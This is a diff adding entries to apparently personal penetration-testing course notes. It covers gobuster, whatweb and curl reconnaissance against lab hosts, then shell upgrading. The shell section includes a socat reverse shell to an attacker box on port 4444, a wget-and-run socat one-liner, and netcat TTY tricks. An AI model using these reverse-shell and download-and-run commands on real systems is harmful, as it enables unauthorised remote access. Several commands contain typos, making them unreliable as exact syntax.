@@ -91,6 +91,18 @@ sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace
 sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53
 ```
 
+```bash
+# other scanning
+gobuster dir -u http://10.10.10.121/  -w /usr/share/dirb/wordlists/common.txt
+# seclists install
+git clone https://github.com/danielmiessler/SecLists
+sudo apt install seclists -y
+
+gobuster dins -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
+
+curl -IL https://www.inlanefreight.com
+whatweb --noerrorss 10.10.10.0/24
+
 ## metasploit framework
 
 ```bash
@@ -263,6 +275,37 @@ mv test2.rar test2
 ls
 msf-virustotal -k <API key> -f test2.rar
 # 14 exploit coding example
+```
+
+```bash
+# upgrading shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+socat file:`tty`,raw,echo=0 tcp-listen:4444 # attack box listen
+socat exec:'bash -li', pty,stderr,setsid,siginit,sane tcp:10.0.3.4:4444 #victim -launch
+wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,siginit,sane tcp:10.0.3.4:4444
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+
+# TODO: getting started basic tools, socat standalone binary transfer
+# upgrade from nc w/ magic #victim
+nc -lvp 4444 #attack
+# backtround w/ ctrl z
+echo $TERM
+stty -a
+stty raw -echo
+fg
+reset
+# $ export SHELL=bash
+# $ export TERM=xterm256-color
+# $ stty rows 38 colums 116
+
+sudo apt- install tmux -y
+tmux
+# ctrl-b + c
+# 0 or 1 switch num window
+# shift + % # split vertical
+# shift + " # split horizontal
+# up down arrows # switch vertical
+# left right arrows # switch horizontal
 ```
 
 ```bash
